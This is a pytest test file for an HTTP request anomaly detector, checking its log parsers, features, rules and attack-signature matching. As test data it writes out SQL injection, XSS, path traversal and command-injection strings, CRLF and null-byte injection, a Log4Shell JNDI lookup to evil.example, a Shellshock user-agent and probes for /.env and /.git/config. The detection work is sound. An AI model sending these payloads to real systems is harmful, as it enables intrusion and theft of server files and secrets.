import pandas as pd

from anomaly_detection.features import (
    FEATURE_COLUMNS,
    extract_features,
    find_signatures,
    find_traversal,
    parse_apache_line,
    parse_csic_block,
    requests_to_dataframe,
)
from anomaly_detection.preprocessing import fit_preprocessor
from anomaly_detection.rules import (
    ALL_RULES,
    MALFORMED_REQUEST,
    PATH_TRAVERSAL,
    SUSPICIOUS_PAYLOAD,
    UNKNOWN_METHOD,
    UNKNOWN_PARAMETER,
    UNKNOWN_PATH,
    Vocabulary,
    apply_rules,
    triggered_rules,
)


NORMAL_URLS = [
    "http://localhost:8080/tienda1/index.jsp",
    "http://localhost:8080/tienda1/publico/anadir.jsp?id=3"
    "&nombre=Vino+Rioja&precio=100&cantidad=55"
    "&B1=A%F1adir+al+carrito",
    "/products?id=123",
    "/images/logo.png",
]


def make_vocabulary():
    requests = [
        {"method": "GET", "url": "/shop/item?id=1&name=a"},
        {"method": "GET", "url": "/shop/list"},
        {
            "method": "POST",
            "url": "/shop/buy",
            "body": "item=1&qty=2",
        },
    ]
    return Vocabulary.fit(requests_to_dataframe(requests))


def test_extract_features():
    features = extract_features(
        method="GET",
        url="/products?id=123",
        user_agent="Mozilla/5.0",
    )

    assert features["method"] == "GET"
    assert features["query_param_count"] == 1
    assert features["url_length"] > 0


def test_host_and_scheme_are_ignored():
    absolute = extract_features(
        "GET", "http://localhost:8080/shop/item?id=1"
    )
    relative = extract_features("GET", "/shop/item?id=1")

    assert absolute == relative


def test_body_is_parsed():
    features = extract_features(
        "POST", "/shop/buy", body="item=1&qty=2&note=x"
    )

    assert features["body_length"] == len("item=1&qty=2&note=x")
    assert features["body_param_count"] == 3
    assert features["param_names"] == ("item", "qty", "note")


def test_csic_parser():
    block = (
        "GET http://localhost:8080/tienda1/index.jsp HTTP/1.1\n"
        "User-Agent: Mozilla/5.0\n"
        "Host: localhost:8080\n"
        "\n"
    )

    request = parse_csic_block(block)

    assert request["method"] == "GET"
    assert request["user_agent"] == "Mozilla/5.0"
    assert request["body"] == ""


def test_csic_parser_reads_post_body():
    block = (
        "POST http://localhost:8080/tienda1/publico/autenticar.jsp"
        " HTTP/1.1\n"
        "User-Agent: Mozilla/5.0\n"
        "Content-Type: application/x-www-form-urlencoded\n"
        "Content-Length: 31\n"
        "\n"
        "login=bob:x&pwd=secret&B1=Entrar\n"
    )

    request = parse_csic_block(block)

    assert request["method"] == "POST"
    assert request["body"] == "login=bob:x&pwd=secret&B1=Entrar"
    # Linia z body zawierająca ":" nie może zostać uznana za nagłówek.
    assert request["user_agent"] == "Mozilla/5.0"


def test_apache_parser():
    line = (
        '247.117.214.86 - Kristy91 '
        '[01/Jan/2024:00:00:01 +0000] '
        '"DELETE /images/logo.png HTTP/1.1" '
        '401 49236 '
        '"https://clueless-boulevard.name/api/v1/auth/logout" '
        '"FakerBot/0.2.5"'
    )

    request = parse_apache_line(line)

    assert request["method"] == "DELETE"
    assert request["url"] == "/images/logo.png"
    assert request["user_agent"] == "FakerBot/0.2.5"


def test_attack_signatures_are_detected():
    attacks = [
        ("GET", "/p?id=1' UNION SELECT user,pass FROM users--", ""),
        ("GET", "/p?id=1%27+OR+1%3D1--", ""),
        ("GET", "/p?q=%3Cscript%3Ealert(1)%3C/script%3E", ""),
        ("GET", "/p?f=%252e%252e%252fetc%252fpasswd", ""),  # podwójne kodowanie
        ("POST", "/p", "login=bob%40%3CSCRipt%3Ealert%28Paros%29"),
        ("POST", "/p", "name=a%00b"),
        ("GET", "/p?x=1;cat%20/etc/passwd", ""),
        ("GET", "/p?x=a%0d%0aSet-Cookie:x", ""),
    ]

    for method, url, body in attacks:
        features = extract_features(method, url, body=body)
        assert features["has_suspicious_keywords"] == 1, (url, body)


def test_path_traversal_is_detected():
    for url in ["/../../etc/passwd", "/a/%2e%2e/%2e%2e/b", "/f?p=../../x"]:
        assert extract_features("GET", url)["has_path_traversal"] == 1, url


def test_normal_requests_are_not_flagged():
    for url in NORMAL_URLS:
        features = extract_features("GET", url)
        assert features["has_suspicious_keywords"] == 0, url
        assert features["has_path_traversal"] == 0, url
        assert features["is_malformed"] == 0, url


def test_malformed_input_does_not_raise():
    too_many = "/a?" + "&".join(f"p{i}=1" for i in range(1001))

    for url in [too_many, "http://[::1/x"]:
        features = extract_features("GET", url)
        assert features["is_malformed"] == 1, url


def test_missing_and_unknown_values_are_handled():
    features = extract_features(None, None, None, None)

    assert features["method"] == "OTHER"
    assert features["path"] == "/"
    assert features["param_names"] == ()


def test_feature_columns_match_dataframe():
    frame = requests_to_dataframe(
        [{"method": "GET", "url": "/x?a=1", "user_agent": "Mozilla"}]
    )

    assert list(frame.columns) == FEATURE_COLUMNS


def test_rules_stay_quiet_on_known_traffic():
    vocabulary = make_vocabulary()

    for method, url, body in [
        ("GET", "/shop/item?id=9&name=zz", ""),
        ("GET", "http://example.org/shop/list", ""),
        ("POST", "/shop/buy", "item=7&qty=1"),
    ]:
        row = extract_features(method, url, body=body)
        assert triggered_rules(row, vocabulary) == [], url


def test_rules_fire_on_unseen_vocabulary_and_payloads():
    vocabulary = make_vocabulary()

    def rules(method, url, body=""):
        row = extract_features(method, url, body=body)
        return triggered_rules(row, vocabulary, ALL_RULES)

    assert rules("GET", "/shop/item?idA=1") == [UNKNOWN_PARAMETER]
    assert rules("GET", "/shop/list/") == [UNKNOWN_PATH]
    assert rules("PUT", "/shop/list") == [UNKNOWN_METHOD]
    assert rules("POST", "/shop/buy", "item=1&qtyA=2") == [
        UNKNOWN_PARAMETER
    ]

    hits = rules("GET", "/../../etc/passwd")
    assert PATH_TRAVERSAL in hits and SUSPICIOUS_PAYLOAD in hits

    assert MALFORMED_REQUEST in rules("GET", "http://[::1/x")


def test_apply_rules_matches_per_row_results():
    vocabulary = make_vocabulary()
    frame = requests_to_dataframe([
        {"method": "GET", "url": "/shop/list"},
        {"method": "GET", "url": "/shop/nope"},
    ])

    assert apply_rules(frame, vocabulary, ALL_RULES) == [[], [UNKNOWN_PATH]]


def test_vocabulary_roundtrip(tmp_path):
    vocabulary = make_vocabulary()
    file = tmp_path / "vocabulary.json"

    vocabulary.save(file)

    assert Vocabulary.load(file) == vocabulary


def test_preprocessor_uses_body_features_and_ignores_rule_columns():
    requests = [
        {
            "method": "POST" if i % 2 else "GET",
            "url": f"/shop/item?id={i}",
            "user_agent": "Mozilla/5.0",
            "body": "a=1&b=2" * (i % 5) if i % 2 else "",
        }
        for i in range(60)
    ]
    frame = requests_to_dataframe(requests)

    preprocessor, X = fit_preprocessor(frame)
    names = list(preprocessor.get_feature_names_out())

    assert "body_length" in names
    assert "path" not in names and "param_names" not in names
    assert X.shape == (60, len(names))
    assert pd.notna(X).all()


def test_apache_parser_handles_escaped_quotes():
    # Apache zapisuje " jako \" – taki wpis nie może być pomijany.
    line = (
        '1.2.3.4 - - [10/Oct/2024:13:55:36 +0000] '
        '"GET /search?q=\\"><script>alert(1)</script> HTTP/1.1" '
        '200 512 "-" "evil\\"agent"'
    )

    request = parse_apache_line(line)

    assert request["url"] == '/search?q="><script>alert(1)</script>'
    assert request["user_agent"] == 'evil"agent'
    assert extract_features(
        request["method"], request["url"]
    )["has_suspicious_keywords"] == 1


def test_apache_parser_decodes_hex_escapes():
    line = (
        '1.2.3.4 - - [10/Oct/2024:13:55:36 +0000] '
        '"GET /a\\x00b HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
    )

    assert parse_apache_line(line)["url"] == "/a\x00b"


def test_open_world_default_ignores_unseen_vocabulary():
    vocabulary = make_vocabulary()

    # Nowa ścieżka, nowy parametr i nowa metoda to w trybie open-world
    # normalny ruch (np. nowa strona, ?utm_source=...).
    for method, url in [
        ("GET", "/shop/brand-new-page"),
        ("GET", "/shop/item?utm_source=newsletter"),
        ("PUT", "/shop/list"),
    ]:
        row = extract_features(method, url)
        assert triggered_rules(row, vocabulary) == [], url


def test_open_world_rules_work_without_vocabulary():
    row = extract_features("GET", "/p?id=1' UNION SELECT a FROM b--")

    assert triggered_rules(row, None) == [SUSPICIOUS_PAYLOAD]


def test_open_web_probes_are_detected():
    cases = [
        ("/x", "${jndi:ldap://evil.example/a}"),          # Log4Shell w UA
        ("/x", "() { :;}; /bin/bash -c 'id'"),             # Shellshock w UA
        ("/x", "sqlmap/1.7.2#stable (https://sqlmap.org)"),
        ("/.env", "Mozilla/5.0"),
        ("/.git/config", "Mozilla/5.0"),
    ]

    for url, user_agent in cases:
        features = extract_features("GET", url, user_agent)
        assert features["has_suspicious_keywords"] == 1, (url, user_agent)


def test_real_world_benign_strings_are_not_flagged():
    # Przypadki niewidoczne w CSIC, a częste na prawdziwym serwerze.
    cases = [
        ("/search?q=how+to+delete+from+history", "Mozilla/5.0"),
        ("/search?q=select+a+gift+from+amazon", "Mozilla/5.0"),
        ("/search?q=update+your+profile+settings", "Mozilla/5.0"),
        ("/page;id=5;lang=pl", "Mozilla/5.0"),
        ("/archive/2019--2020", "Mozilla/5.0"),
        ("/blog/sql-injection-explained", "Googlebot/2.1"),
        ("/x", "Mozilla/5.0 (Linux; U; Android 4.4.2; id-id; SM-T116NU) "
               "AppleWebKit/534.30"),
    ]

    for url, user_agent in cases:
        features = extract_features("GET", url, user_agent)
        assert features["has_suspicious_keywords"] == 0, (url, user_agent)


def test_sql_statement_breaking_out_of_a_value_is_detected():
    for url in ["/p?x=1'+DELETE+FROM+USERS", "/p?q=1;DROP+TABLE+users"]:
        assert extract_features("GET", url)["has_suspicious_keywords"] == 1


def test_find_signatures_reports_evidence_and_field():
    matches = find_signatures(
        "/p?id=1' UNION SELECT user,pass FROM users--",
        user_agent="Mozilla/5.0",
    )
    names = {match["signature"] for match in matches}

    assert "sql_union_select" in names
    first = matches[0]
    assert first["field"] == "url"
    assert first["category"] == "sql_injection"
    assert "UNION SELECT" in first["evidence"].upper()

    body_match = find_signatures("/p", body="a=%3Cscript%3Ex")[0]
    assert body_match["field"] == "body"

    assert find_signatures("/products?id=5", user_agent="Mozilla/5.0") == []


def test_find_signatures_agrees_with_the_feature_flag():
    cases = [
        ("/p?id=1' OR 1=1--", "", "Mozilla/5.0"),
        ("/p?q=hello", "", "sqlmap/1.0"),
        ("/p", "x=%00", "Mozilla/5.0"),
        ("/products?id=5", "", "Mozilla/5.0"),
    ]

    for url, body, user_agent in cases:
        flagged = extract_features(
            "POST", url, user_agent, body
        )["has_suspicious_keywords"]

        assert bool(flagged) == bool(
            find_signatures(url, body, user_agent)
        ), (url, body, user_agent)


def test_find_traversal_returns_evidence():
    assert "../" in find_traversal("/a/../../etc/passwd")
    assert find_traversal("/a/b") is None
